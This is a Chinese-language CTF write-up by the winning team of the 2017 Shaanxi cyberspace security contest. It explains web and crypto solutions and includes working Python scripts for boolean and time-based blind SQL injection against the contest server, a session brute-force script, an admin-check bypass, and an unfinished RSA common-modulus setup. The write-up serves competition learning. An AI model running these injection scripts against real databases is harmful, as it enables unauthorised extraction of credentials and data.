# 【CTF攻略】2017年陕西省网络空间安全技术大赛过关攻略
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[Mirage](http://bobao.360.cn/member/contribute?uid=2582786425)
预估稿费：500RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**前言**
为提高大学生的网络安全技术水平，培养大学生的团队协作能力，由陕西省兵工学会主办，西安工业大学承办的“2017年第三届陕西省网络空间安全技术大赛”即将于2017年4月15-16日进行线上初赛，2017年5月13日进行线下总决赛。文章为本次大赛第一名的队伍Mirage的writeup。
**  
**
**web**
* * *
**签到题**
直接源代码代码审计，php弱类型 然后第二关 构造
    key=0; $c=json_encode($b); echo $c; ?>
**抽抽奖**
没有数据传输，因此判断代码在本地。然后在JQuery.js文件里发现JSfuck，解密然后console直接输入getFlag即可
**继续抽**
直接爆破，脚本如下
    import requests
    import hashlib
    def encode(str):
        end = ""
        for s in str:
            if ord(s)127:
                end+="%x"%(255-(ord(s)-128))
        return end
    flag = []
    for x in range(0,200):
        cookies = {'PHPSESSID': '3k2rd4536me3rjsojf473vctd7'}
        r = requests.get("http://117.34.111.15:81/token.php",cookies=cookies)
        m = hashlib.md5(str(x)).hexdigest()
        print x
        print "http://117.34.111.15:81/get.php?token="+r.text[1:-1]+"&id="+encode(m)
        s = requests.get("http://117.34.111.15:81/get.php?token="+r.text[1:-1]+"&id="+encode(m),cookies=cookies)
        flag.append(s.text)
        print s.text
    print set(flag)
**So easy**
代码审计发现 这里没有用escape_string,因此存在注入 可是折腾了好久
    function show($username){
      global $conn;
      $sql = "select role from `user` where username ='".$username."'";
      $res = $conn ->query($sql);
      if($res->num_rows>0){
      echo "$username is ".$res->fetch_assoc()['role'];
      }else{
      die("Don't have this user!");
      }
    }
然后通过过滤函数，找到了去年sysclover的一篇Writeup
然后才发现我前段时间遇到过这个操作符构造注入了，可是当时比较忙，没时间做，因此技能点没有get
脚本长这样，虽然丑点，但是能跑出passwd
    # --coding:utf-8--    import requests
    url="http://117.34.111.15:89/?action=show"
    passwd=""
    lists="1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
    for i in xrange(1,33):
        print i
        for p in lists:
            param={'username':"-1'=(ascii(mid((passwd)from("+str(i)+")))="+str(ord(p))+")='0"}
            print requests.post(url,data=param).content
            if "admin" in requests.post(url,data=param).content:
                passwd=passwd+p
                break
    print passwd
登陆就是flag 登陆这里的admin判断直接用admin%c2这个去绕过，因为刚前段时间看过ph师傅的最近刚写的文章，然后很快就反应过来了
**Wrong**
随手就出swp文件
      3 error_reporting(0);
      4 function create_password($pw_length =  10)
      5 {
      6 $randpwd = "";
      7 for ($i = 0; $i 
**just a test**
不知道是谁，在某个地方插了个弹窗。造成XSS的假象，然后打了一中午，发现什么也没有，就很绝望！
后来队友提醒是不是注入，然后在URL里试了一下真的是注入？？？exm？？？ 先把脚本放上
    # -*- coding:utf-8 -*-    import requests
    import time
    flag=""
    for j in xrange(1,50):
        for i in xrange(33,127):
            url="http://117.34.111.15:83/chandni-jewel'%20union%20select%20if((select%20ascii(substr(f1ag,"+str(j)+",1))%20from%20test.`fl@g`%20limit%200,1)="+str(i)+",sleep(0.4),1)%2523"
            a=time.time()
            requests.get(url)
            #print time.time()-a
            print '.',
            if time.time()-a>4:
                print chr(i)
                flag=flag+str(chr(j))
                break
    print flag
    #database() 5 
    #database() test
    #table1 fl@g
    #column f1ag
    #http://117.34.111.15:83/chandni-jewel' union select if((select ascii(substr(f1ag," str(j) ",1)) from test.fl@g limit 0,1)=" str(i) ",sleep(0.4),1)%23
    #http://117.34.111.15:83/chandni-jewel'%20union%20select%20if((select%20length(column_name)%20from%20information_schema.columns%20limit 1,1)="+str(i)+",sleep(0.4),1)%2523
开始爆Flag始终没有爆出来，又很绝望。 怀疑人生然后把payload放到Bp里结果报错了，才发现表名里有个@，在payload里加个反引号就行了
服务器响应不是很好，跑了很多遍才跑出来flag
**admin**
这题和逆向狗研究了一晚上，只过了第一关。但是题目还是蛮有意思的
    hint www.tar.gz
大致浏览看了下功能
刚开始一直想用hitcon 2015的crypt1的思路去伪造登陆，但是后来发现因为在
    $token = '';
    $user = '';
    $admin = 0;
    if (isset($_COOKIE['token'])&&isset($_COOKIE['sign'])) {
        $sign = $_COOKIE['sign'];
        $token = $_COOKIE['token'];
        $arr = explode('|', token_decrypt($token));
        if (count($arr) == 3) {
            if (md5(get_indentify().$arr[0]) === $arr[2] && $sign === $arr[2]) {
                $user = $arr[0];
                $admin = (int)$arr[1];
            }
        }
    }
有md5校验，因此第一种想法被pass了
然后逆狗想到可以 构造 $username|$admin|$md5+padding 为用户名注册然后修改cookie即可伪造登录 因为是CFB模式
第二个明文分组的解密只与第一个分组的密文有关，因此可以解出flag的后半段 然而没什么luan用！
比赛结束以后pcat说是压缩包的时间，然后把每个时间都试过去？然而？
**Crypto**
* * *
**签到-欢迎来到CSTC2017 10**
    ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30=
签到题， base64 解密，flag : flag{WeiSuoFyu_BieLang}
**crypt2 200**
通过流量包的分析可以发现有两个人在用相同的N不同的E，发送给服务器，然后返回一段密文
这个时候就公用了一个N，可以使用RSA的共模攻击来解决这个问题。
    python
    e1 = 3
    n1 = 295722865793798033460986793237541395631977030560369657198479193181766567057754287459743723539658396944636677358515648785314565228205230261697963097395812598331880872455869139731578362748460265979187318613591087019956434720952036757300875287830045303192314296720794872499471775336492552983354160440794987630219
    c1 = 15839981826811799772634108807452583389456749354145216574984222938829756753294086924872110969732766251541785740757693788214686206806750788561292837339359061701208001297802597
    e2 =7 
    n2 = 295722865793798033460986793237541395631977030560369657198479193181766567057754287459743723539658396944636677358515648785314565228205230261697963097395812598331880872455869139731578362748460265979187318613591087019956434720952036757300875287830045303192314296720794872499471775336492552983354160440794987630219
    c2 = 155249880144094802834481749928592059461139577288355397447367776112547796231086359709731959934830872744121046740255722326833958323017063249153808715277882003426237167195613685868065416967276090907468102632169601247074603247233477582113388294508579159856963458656960060635516531998836585340648309492666005454968